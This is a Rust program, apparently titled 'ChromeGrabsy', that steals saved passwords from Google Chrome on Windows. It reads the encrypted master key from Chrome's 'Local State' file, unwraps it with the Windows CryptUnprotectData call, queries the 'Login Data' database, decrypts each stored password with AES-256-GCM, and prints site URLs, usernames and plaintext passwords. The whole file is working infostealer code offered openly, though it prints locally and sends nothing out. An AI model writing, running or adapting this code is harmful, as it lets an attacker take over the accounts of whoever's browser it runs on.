use aes_gcm::{Aes256Gcm, Key, KeyInit, Nonce, aead::Aead};
use serde_json::Value;
use whoami::username;
use std::{path::Path, fs, ptr::null_mut, slice};

use base64::{Engine, engine::general_purpose};
use windows::Win32::{Security::Cryptography::{CRYPT_INTEGER_BLOB, CryptUnprotectData}, System::Memory::LocalFree};
use rusqlite::Connection;

fn main() {
    println!("Hello, world!");

    let mut grabsy = ChromeGrabsy::new();
    grabsy.set_key();
    grabsy.open_db();
    grabsy.get_logins();
}

struct ChromeGrabsy {
    key: Vec<u8>,
    path_base: String,
    key_file: String,
    path_db: String,
    db_con: Option<Connection>,
}

#[derive(Debug)]
struct Login {
    action_url: String,
    username_value: String,
    password_value: Vec<u8>,
}

impl ChromeGrabsy {
    fn new() -> Self {
        ChromeGrabsy { 
            key: Vec::new(),
            path_base: format!("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data", username()),
            key_file: "Local State".to_string(),
            path_db: "Default\\Login Data".to_string(),
            db_con: None,
        }
    }

    fn open_db(&mut self) {
        let db_path = format!("{}\\{}", self.path_base, self.path_db);
        self.db_con = Some( Connection::open(&db_path).unwrap() );
    }

    fn get_logins(&self) {
        let query = "SELECT action_url, username_value, password_value FROM logins";
        let db_con = self.db_con.as_ref().unwrap();
        
        let mut stmt = db_con.prepare(query).unwrap();

        let login_iter = stmt.query_map([], |row| {
            Ok(Login {
                action_url: row.get(0).unwrap(),
                username_value: row.get(1).unwrap(),
                password_value: row.get(2).unwrap(),
            })
        }).unwrap();

        for value in login_iter {
            let pass = &value.as_ref().unwrap().password_value;
            let pass = self.decode_password(&pass);
            let user = &value.as_ref().unwrap().username_value;
            let url = &value.as_ref().unwrap().action_url;
            println!("URL: {}\n\tUser:{}\n\tPass: {}", url, user, pass);
        }
    }

    fn decode_password(&self, password: &Vec<u8>) -> String {
        // Ehm... magic
        let iv = &password[3..15];
        let enc_pas = &password[15..];

        let mut key: [u8; 32] = [0; 32];
        key.copy_from_slice(&self.key[..]);
        let key: &Key<Aes256Gcm> = &key.into();

        let cipher = Aes256Gcm::new(&key);
        let mut nonce = Nonce::default();
        nonce.copy_from_slice(iv);

        let plaintext = cipher.decrypt(&nonce, enc_pas.as_ref()).unwrap();
        let plaintext = &plaintext[..];
        let out = String::from_utf8(plaintext.to_vec()).unwrap();

        return out
    }

    fn set_key(&mut self) {
        let path = format!("{}\\{}", self.path_base, self.key_file);
        let file = Path::new(&path);

        // Read settings file, convert to json
        let contents = fs::read_to_string(&file).expect("Failed to read keyfile");
        let js: Value = serde_json::from_str(&contents).unwrap();

        // Get key from settings - json
        let key = js.get("os_crypt").and_then(|value| value.get("encrypted_key")).unwrap().as_str().unwrap();

        // Base64 decode
        let mut out = general_purpose::STANDARD.decode(key).unwrap();

        // WinAPI -> CryptUnprotectData
        let out = self.unprotect(&mut out[5..]).unwrap();

        self.key = out;
    }

    fn unprotect(&self, data: &mut [u8]) -> windows::core::Result<Vec<u8>>{
        let data_in = CRYPT_INTEGER_BLOB { cbData: data.len() as u32, pbData: data.as_mut_ptr() };
        let mut data_out = CRYPT_INTEGER_BLOB { cbData: 0, pbData: null_mut() };

        unsafe {
            CryptUnprotectData(
                &data_in, None, None, None, None, 0, &mut data_out
            ).ok()?;

            let bytes = slice::from_raw_parts(data_out.pbData, data_out.cbData as usize).to_vec();
            // TODO: idk how to properly call this function
            //LocalFree(data_out.pbData as isize);
            Ok(bytes)
        }
    }
}